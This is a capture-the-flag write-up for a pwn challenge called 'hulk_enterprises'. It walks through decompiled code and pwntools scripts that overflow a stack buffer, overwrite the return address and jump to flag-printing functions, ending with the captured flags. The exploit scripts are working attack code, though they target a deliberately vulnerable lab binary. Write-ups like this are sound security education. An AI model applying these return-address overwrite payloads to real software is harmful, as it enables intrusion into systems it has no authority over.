# **Name: hulk_enterprises**
**Category:** pwn
**Points:** 140 (2 flags)
**Description:**
hulk it.

```py
#!/usr/bin/python

from pwn import *
context.terminal = ['tmux', 'split']

p = gdb.debug("./censored_chal", '''
           # Set the follow-fork-mode to "parent"
           break main
           ''')

p.interactive()
```

- Flag 1: 70 points
  - Access: nc chal.ctf-league.osusec.org 1309
  - Download: https://chal.ctf-league.osusec.org/pwn/hulk/censored_chal
- Flag 2: 70 points

## First access

connecting to the server we get the following output:

```shell
Hello!
Welcome to HULK Enterprise's Linux Library!
Welcome, new user!
What username would you like to use?
```

inputting anything into the server after this results in the server closing and nothing happening

after that we take a look a the binary to try and find anything interesting.

## Looking at the binary

using a decomplier on the source code we can see two points on interest that will give us a flag

### POI 1

```c
void read_flag(void) {
  char local_30 [32];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  local_30[0] = '\0';
    ...
  local_30[0x1f] = '\0';
  fread(local_30,1,0x1f,local_10);
  puts(local_30);
  fflush(_stdout);
  return;
}
```

### POI 2

```c
void menu(int param_1) {
  char local_1c [20];
  if (param_1 == -0x35012ff3) {
    puts("censored_the_flag\ngoodbye, admin\n");
    fflush(_stdout);
  }
  else {
    puts("Welcome, new user!");
    puts("What username would you like to use?");
    fflush(_stdout);
    fgets(local_1c,0xff,_stdin);
    puts(local_1c);
    puts("registered! goodbye.");
    fflush(_stdout);
  }
  return;
}
```

## Exploiting the binary

so we know where to try and get the flags from, we just have to figure out how to get them.

based on the small lecture before the challenge was released we have to use the binary assembly to get the addresses of the functions and jump to them to get the flags somehow.

### Getting the addresses

Since i was doing this on an m1 mac I tried to use a kali linux vm to be able to run the binary and get the addresses of the functions through gdb but even the vm was encountering issues with executing the binary, but i was able to use ghidra locally to get the addresses of the functions. (I was using an online decomplier that did not show the assembly previouslly)

Here i was able to see where the functions were located in the binary and actually get the addresses of the functions.

the first flag, within the funciton 'read_flag' was located at the address '08049192' and the second flag, which was located in the function 'menu' was located at the address '08049234'

### Jumping to the functions

cool so now we know where to jump to in the binary, we just have to figure out how to jump to them.

One of the officers's gave us a hint that we could use 'pwntools' to jump to the functions, so with a little googling ~~and maybe a second hint~~ we were able to figure out how to jump to the functions.

```python
from pwn import *
context.terminal = ['tmux', 'split']

p = remote("chal.ctf-league.osusec.org", 1309)
p.sendline(b"hi" + p32(0x08049240))
p.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaa" + p32(0x08049192) + p32(0x08049192))
p.interactive()
```

the code above is the result of multiple trial and errors of trying to get past the buffers and jump to the functions.

but eventually after getting 24 'a's in the first input and overwrite the stack with the address of the function 'read_flag' we were able to get the first flag.

### Flag 1

```shell
osu{fun_and_profit}
```

## Getting the second flag

after we got the first flag, all it leaves is the second flag, which is located in the function 'menu'

this requires a bit more work as we have to set the parameter of the function to the correct value to get the flag.

We started with just copying the same code from the first flag and changing the address of the function to the address of the function 'menu'.

```python
from pwn import *
context.terminal = ['tmux', 'split']

p = remote("chal.ctf-league.osusec.org", 1309)
p.sendline(b"a" *   28  + p32(0x08049234) + p32(0xcafed00d) + p32(0xcafed00d) )
p.interactive("")
```

but we did change the garbage input of the first input to get past the buffer, since it is way easier to change/know how many a's we are sending (or bytes in general).

next we took a closer look at the function 'menu' and just copy and pasted the value it was checking for into the code to send to the server. 

this alone did not work, so we tried to increase the amount of 'a's we were sending to the server to see if we could get the flag.

and that did work, we were able to get the second flag, we needed a total of 28 'a's (or bytes) to get past the buffer and then we were able to get the flag.

### Flag 2

```shell
osu{args_or_ret?}
```

## Other ideas I had that did not work

- tried to jump directly to the if statement in the function 'menu' 
- tried to jump to the function 'menu' and then jump to the if statement
- tried to get past input sanitization

**I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved**
